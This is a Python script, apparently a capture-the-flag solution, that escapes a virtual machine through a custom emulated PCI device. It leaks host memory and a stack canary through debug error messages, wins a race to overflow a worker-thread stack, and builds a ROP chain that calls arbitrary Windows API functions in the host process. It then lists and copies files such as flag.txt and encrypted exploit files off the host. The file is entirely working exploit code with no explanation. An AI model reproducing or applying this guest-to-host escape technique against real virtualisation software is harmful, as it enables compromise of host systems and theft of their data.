import base64
import ctypes
import fcntl
import mmap
import os
import random
import struct
import sys
import time
import zlib


def read_pci_file(fn):
    return open(f"{pci_dir}/{fn}", "rb").read().rstrip(b"\n")

for dn in os.listdir("/sys/bus/pci/devices"):
    pci_dir = os.path.join("/sys/bus/pci/devices", dn)
    if read_pci_file("subsystem_vendor") == b"0x4141" and read_pci_file("subsystem_device") == b"0x4141":
        break
else:
    raise Exception("PCI device not found")

bar0_fd = os.open(f"{pci_dir}/resource0", os.O_SYNC | os.O_RDWR)
bar0 = mmap.mmap(bar0_fd, 4096)

def fromstr(x):
    if isinstance(x, str):
        x = x.encode()
    return struct.unpack(">Q", x.rjust(8, b"\0"))[0]

def bar0_val(type, off):
    return type.from_buffer(bar0, off)

Signature = bar0_val(ctypes.c_uint64, 0)
SignatureExt = bar0_val(ctypes.c_uint64, 8)
MonoStatus = bar0_val(ctypes.c_uint64, 0x10)
MonoCrc = bar0_val(ctypes.c_uint32, 0x18)
MonoGuestAddress = bar0_val(ctypes.c_uint64, 0x20)
MonoGuestSize = bar0_val(ctypes.c_uint64, 0x28)
NotUsed32B = bar0_val(ctypes.c_uint32, 0x30)
NotUsed32B2 = bar0_val(ctypes.c_uint32, 0x34)
DebugErrorMessage = bar0_val(ctypes.c_char * 0x50, 0x120)
MultiStatus = bar0_val(ctypes.c_uint64, 0x200)
MultiGuestAddress = bar0_val(ctypes.c_uint64, 0x210)
MultiGuestSize = bar0_val(ctypes.c_uint64, 0x218)
DebugErrorMessageAsync = bar0_val(ctypes.c_char * 0x50 * 6, 0x500)

mm_fd = os.open("/dev/mm_device", os.O_SYNC | os.O_RDWR)

def reserve_mm(size):
    buf = bytearray(8)
    struct.pack_into("<Q", buf, 0, size)
    fcntl.ioctl(mm_fd, 0x5700, buf)
    addr, = struct.unpack_from("<Q", buf, 0)
    mm = mmap.mmap(mm_fd, size, offset=addr)
    print(hex(addr))
    return (addr, mm)

def release_mm(addr):
    buf = bytearray(8)
    struct.pack_into("<Q", buf, 0, addr)
    fcntl.ioctl(mm_fd, 0x5701, buf)

# physical address that should be totally invalid
INVALID_ADDRESS = 0xfefefefedddddddd

# enable debug messages - very useful!
SignatureExt.value = fromstr("DEVMODE")

# reset MultiThread
MultiStatus.value = fromstr("ABORT")

def clear_debugmsg():
    NotUsed32B.value = 0xfeedface
    for i in range(6):
        MonoGuestAddress.value = INVALID_ADDRESS
        MonoGuestSize.value = 0
        MonoStatus.value = fromstr("PREPARE")
        while MonoStatus.value != fromstr("READY"):
            time.sleep(0.01)
        MonoStatus.value = fromstr("GO!!")
        while MonoStatus.value != fromstr("FINISHED"):
            time.sleep(0.01)

def get_debugmsg():
    msg1 = DebugErrorMessage.value
    if msg1 == b"Invalid Access to field 'NotUsed32B' on MMIO BAR#0 invalid value: 0xfeedface.":
        msg1 = None
    msg2 = []
    for i in range(6):
        msg = DebugErrorMessageAsync[i].value
        if msg and msg != b"Invalid size of file in Mono mode.":
            msg2.append(msg)
    return msg1, msg2

FastLeakOffset = bar0_val(ctypes.c_uint64 * 0x2, 0x160)

def _read_mem_str(addr):
    MonoStatus.value = addr
    # expect b"Invalid Access to field 'MonoStatus' on MMIO BAR#0 invalid value: "
    leak = struct.pack("<Q", FastLeakOffset[0])
    if b"\0" not in leak:
        leak += struct.pack("<Q", FastLeakOffset[1])
    assert leak.startswith(b": ")
    leak = leak[2:].split(b"\0")[0]
    if leak.endswith(b"."):
        leak = leak[:-1]
    return leak

def read_mem(addr, size):
    out = bytearray()
    while len(out) < size:
        res = _read_mem_str(addr)
        if len(res) < 13:
            res += b"\0"
        out += res
        addr += len(res)
    return out[:size]

def read_qword(addr):
    return struct.unpack("<Q", read_mem(addr, 8))[0]

clear_debugmsg()

## Step 1: Leak stack buffer contents
num_items = 0x400
num_threads = 1
addr, mm = reserve_mm(0x10000)
struct.pack_into("<QQ", mm, 0, num_items, num_threads)

for i in range(num_items):
    # copy nothing, but CRC the first i+1 bytes of the stack buffer
    job_addr = INVALID_ADDRESS
    job_size = i + 1
    job_crc = 0xdeadbeef
    struct.pack_into("<QQI", mm, 0x20 + 0x20 * i, job_addr, job_size, job_crc)

MultiGuestAddress.value = addr
MultiGuestSize.value = 0x20 + 0x20 * num_items
MultiStatus.value = fromstr("PREPARE")
while MultiStatus.value != fromstr("READY"):
    time.sleep(0.01)

MultiStatus.value = fromstr("GO!!")
while MultiStatus.value != fromstr("FINISHED"):
    time.sleep(0.01)

print(get_debugmsg())

cur_crc = zlib.crc32(b"")
cur_data = bytearray()
for i in range(num_items):
    crc, = struct.unpack_from("<I", mm, 0x20 + 0x20 * i + 16)
    for ch in range(256):
        c = bytes([ch])
        if zlib.crc32(c, cur_crc) == crc:
            cur_crc = crc
            cur_data += c
            break
    else:
        raise ValueError(f"failed, could not match {crc=:08x} at {i=}")

release_mm(addr)
del mm

stack_leak = cur_data
print("Stack leak:", stack_leak.hex())

ntdll_base = struct.unpack_from("<Q", stack_leak, 0)[0]
stack_addr = struct.unpack_from("<Q", stack_leak, 0x30)[0]
pci_device_base = struct.unpack_from("<Q", stack_leak, 0x100)[0] - 0x7c140 # thread_start
heap_addr = struct.unpack_from("<Q", stack_leak, 0x108)[0]

# stack_addr is +0x80 from the buffer
canary = read_qword(stack_addr + 0x380)
print("Canary leak:", hex(canary))

workerthread = read_qword(stack_addr + 0x3a0)
print("WorkerThread:", hex(workerthread))

device = read_qword(workerthread + 0xd0)
print("Device:", hex(device))

## Create a programmable ropchain.
guest_size = 0x20000
guest_addr, mm = reserve_mm(guest_size)

bootstrap_base = 0x8000
roploop_base = 0x9000

pop_rax = lambda val: [pci_device_base + 0xe72e, val]
pop_rdx = lambda val: [pci_device_base + 0x10abc, val]
pop_rcx = lambda val: [pci_device_base + 0x10b9c, val]
pop_r8_r9 = lambda r8, r9: [
    pop_rdx(r8), pop_rcx(r8),
    pci_device_base + 0x223b7, # mov r8, rdx ; cmp rdx, rcx ; cmovb r8, rcx ; mov rax, r8 ; ret
    pop_rdx(r9),
    pci_device_base + 0xb6fc1, # cmove r9, rdx ; mov rax, r9 ; ret
]
pop_rsi = lambda val: [pci_device_base + 0x453cb, val]
mov_prdx_rax = pci_device_base + 0x80f08 # mov qword [rdx], rax ; ret
mov_rax_prcx = pci_device_base + 0x64f60 # mov rax, qword [rcx] ; ret
mov_rcx_prcx = pci_device_base + 0x32e87 # mov rcx, qword [rcx] ; mov rax, rcx ; ret
add_prcx_rdx = pci_device_base + 0x21a65 # add qword [rcx], rdx ; ret 
load_rax = lambda addr: [pop_rcx(addr), mov_rax_prcx]
store_rax = lambda addr: [pop_rdx(addr), mov_prdx_rax]
mov_rdx_rcx = [pci_device_base + 0x41e0, pop_rdx(0)] # mov qword [rsp+0x08], rcx ; ret
jmp_prsi = pci_device_base + 0x28d8d # jmp qword [rsi]
mov_rsp_rcx = [
    pci_device_base + 0x41e0, # mov qword [rsp+0x08], rcx ; ret
    pci_device_base + 0x8333e, # pop rsp ; and al, 0x08 ; ret
]
# allocate space for Register Parameter Area for calls to regular functions
rpa = [
    pci_device_base + 0x82b29, # add rsp, 0x20 ; pop r14 ; ret
    0, 0, 0, 0, 0,
]

cave = pci_device_base + 0xe6d00

# Short ropchain to bootstrap the longer one - keep this one short so we don't go off the end of the WorkerThread stack
bootstrap = [
    pop_rdx(workerthread), # dummy so that +8 is equal to the worker thread pointer - otherwise WorkerThread::Run crashes

    pop_r8_r9(guest_addr, guest_size),
    pop_rcx(device), pop_rdx(cave),
    pci_device_base + 0xd1d0, rpa, # Device::MapGuestMemory

    load_rax(cave), store_rax(cave + 0x10), pop_rdx(roploop_base), pop_rcx(cave + 0x10), add_prcx_rdx, mov_rcx_prcx,
    mov_rsp_rcx,
]

roploop = [
    pci_device_base + 0x10ac0, rpa, # Thread::thread_sleep
    pop_rcx(cave + 0x10), mov_rcx_prcx, mov_rsp_rcx,
]

def flatten(r, out=None):
    if out is None:
        out = bytearray()
    if isinstance(r, list):
        for x in r:
            flatten(x, out)
    else:
        out += struct.pack("<Q", r)
    return out

bootstrap_bytes = flatten(bootstrap)
roploop_bytes = flatten(roploop)
mm[roploop_base:roploop_base + len(roploop_bytes)] = roploop_bytes

## Step 2: Stack overflow
count = 0
while 1:
    count += 1
    print(f"Attempt {count}...")
    num_items = 0x200
    num_threads = 1
    struct.pack_into("<QQ", mm, 0, num_items, num_threads)
    magic_value1 = random.getrandbits(64)
    magic_value2 = random.getrandbits(64)
    payload = b"\xcc" * 0x400 + struct.pack("<QQQ", canary, magic_value1, magic_value2) + bootstrap_bytes
    
    mm[bootstrap_base:bootstrap_base + len(payload)] = payload
    for i in range(num_items):
        job_addr = addr + bootstrap_base
        job_size = len(payload) & 0xff
        job_crc = 0xdeadbeef
        struct.pack_into("<QQI", mm, 0x20 + 0x20 * i, job_addr, job_size, job_crc)
    
    off = 0x20 + 0x20 * (num_items - 1) + 8 + 1
    val = len(payload) >> 8
    
    MultiGuestAddress.value = addr
    MultiGuestSize.value = 0x20 + 0x20 * num_items
    MultiStatus.value = fromstr("PREPARE")
    while MultiStatus.value != fromstr("READY"):
        time.sleep(0.01)
    
    MultiStatus.value = fromstr("GO!!")
    while 1:
        for i in range(1000000):
            mm[off] = 0x0
            mm[off] = val
        if MultiStatus.value == fromstr("FINISHED"):
            break
    
    if read_qword(stack_addr + 0x388) == magic_value1 and read_qword(stack_addr + 0x390) == magic_value2:
        print("SUCCESS!!!!")
        break

# trigger rop on thread exit
# this might crash the process if we get unlucky; just try again after the VM comes back up
MultiStatus.value = fromstr("ABORT")

while 1:
    h_guest_addr = read_qword(cave)
    if h_guest_addr != 0:
        break

## Step 3: Use programmable ROP to call arbitrary functions
index = roploop_bytes.find(struct.pack("<Q", cave + 0x10))
roploop_sp_pointer = ctypes.c_uint64.from_buffer(mm, roploop_base + index)
h_idle = h_guest_addr + roploop_base

o_roploop_sp = roploop_base + len(roploop_bytes)
h_roploop_sp = h_guest_addr + o_roploop_sp
roploop_sp = ctypes.c_uint64.from_buffer(mm, o_roploop_sp)
roploop_sp.value = h_idle
roploop_sp_pointer.value = h_roploop_sp

def call(func, *args):
    assert len(args) <= 17
    o_retval = 0
    retval = ctypes.c_uint64.from_buffer(mm, o_retval)
    h_retval = h_guest_addr + o_retval
    retval.value = 0
    
    o_funcarg = 0x19000
    arg_vals = {}
    def getarg(n):
        nonlocal o_funcarg
        if n >= len(args):
            return 0
        if n in arg_vals:
            return arg_vals[n]
        val = args[n]
        if isinstance(val, bytes):
            val = val + b"\0"
        elif isinstance(val, str):
            val = (val + "\0").encode("utf-16-le")
        elif isinstance(val, bytearray):
            val = bytes(val)
        
        if isinstance(val, bytes):
            res = h_guest_addr + o_funcarg
            mm[o_funcarg:o_funcarg + len(val)] = val
            o_funcarg += (len(val) + 0xf) & ~0xf
            arg_vals[n] = res
            return res
        
        assert isinstance(args[n], int)
        return args[n]
    
    o_funcrop = 0x18000
    h_funcrop = h_guest_addr + o_funcrop
    funcrop = [
        pop_r8_r9(getarg(2), getarg(3)),
        pop_rcx(getarg(0)), pop_rdx(getarg(1)),
        func, pci_device_base + 0x2624, # add rsp, 0x88 ; ret
        0, 0, 0, 0,
    ]
    for i in range(0x68 >> 3):
        funcrop.append(getarg(4 + i))
    funcrop += [
        store_rax(h_retval),
        pop_rax(h_idle), store_rax(h_roploop_sp),
        pop_rcx(h_idle), mov_rsp_rcx,
    ]
    funcrop_bytes = flatten(funcrop)
    mm[o_funcrop:o_funcrop + len(funcrop_bytes)] = funcrop_bytes
    roploop_sp.value = h_funcrop
    while roploop_sp.value == h_funcrop:
        time.sleep(1e-6)
    for i in range(len(args)):
        if isinstance(args[i], bytearray):
            offset = getarg(i) - h_guest_addr
            args[i][:] = mm[offset:offset + len(args[i])]
    return retval.value

class FuncPtr:
    def __init__(self, addr):
        if addr == 0:
            raise ValueError("Null function pointer!")
        self.addr = addr
    
    def __call__(self, *args):
        return call(self.addr, *args)

GetModuleHandleW = FuncPtr(pci_device_base + 0x45bb0)
GetProcAddress = FuncPtr(pci_device_base + 0x45bb6)

class Library:
    def __init__(self, name):
        self.handle = GetModuleHandleW(name)
    
    def __getattr__(self, name):
        result = FuncPtr(GetProcAddress(self.handle, name.encode()))
        setattr(self, name, result)
        return result

# Now we're cooking!
INVALID_HANDLE_VALUE = (1 << 64) - 1
kernel32 = Library("kernel32.dll")

def host_ls(dn):
    dn = dn.rstrip("\\")
    find_data = bytearray(0x250)
    handle = kernel32.FindFirstFileW(dn, find_data)
    if handle == INVALID_HANDLE_VALUE:
        errno = kernel32.GetLastError()
        raise Exception(f"Failed to list directory {dn}: {errno:#x}")
    while 1:
        attributes, = struct.unpack_from("<I", find_data, 0)
        filesize_high, filesize_low = struct.unpack_from("<II", find_data, 0x1c)
        filesize = (filesize_high << 32) | filesize_low
        filename = find_data[0x2c:0x2c + 260*2].decode("utf-16-le").split("\0", 1)[0]
        print("%08x %12d %s%s" % (attributes, filesize, filename, "/" if (attributes & 0x10) else ""))
        res = kernel32.FindNextFileW(handle, find_data)
        if not res:
            break
    kernel32.FindClose(handle)

def host_readfile(fn):
    GENERIC_READ = 0x80000000
    FILE_SHARE_READ = 1
    FILE_SHARE_WRITE = 2
    OPEN_EXISTING = 3
    FILE_ATTRIBUTE_NORMAL = 0x80
    handle = kernel32.CreateFileW(
        fn,
        GENERIC_READ,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        0,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        0,
    )
    if handle == INVALID_HANDLE_VALUE:
        errno = kernel32.GetLastError()
        raise Exception(f"Failed to open file {fn}: {errno:#x}")
    
    result = bytearray()
    buffer = bytearray(0x1000)
    nbytes_read = bytearray(4)
    while 1:
        if not kernel32.ReadFile(handle, buffer, 0x1000, nbytes_read, 0):
            errno = kernel32.GetLastError()
            raise Exception(f"Failed to read file {fn}: {errno:#x}")
        n = struct.unpack_from("<I", nbytes_read, 0)[0]
        if n == 0:
            break
        result += buffer[:n]
    kernel32.CloseHandle(handle)
    return result

def download_file(fn):
    outfn = fn.rsplit("\\", 1)[1]
    with open(outfn, "wb") as outf:
        outf.write(host_readfile(fn))
    print("saved", outfn)

host_ls(r"C:\exploits\*.*")
download_file(r"C:\exploits\encrypt.exe")
download_file(r"C:\exploits\flag.txt")
download_file(r"C:\exploits\0day.py.enc")
download_file(r"C:\exploits\test.py.enc")
download_file(r"C:\exploits\test.py.raw~")
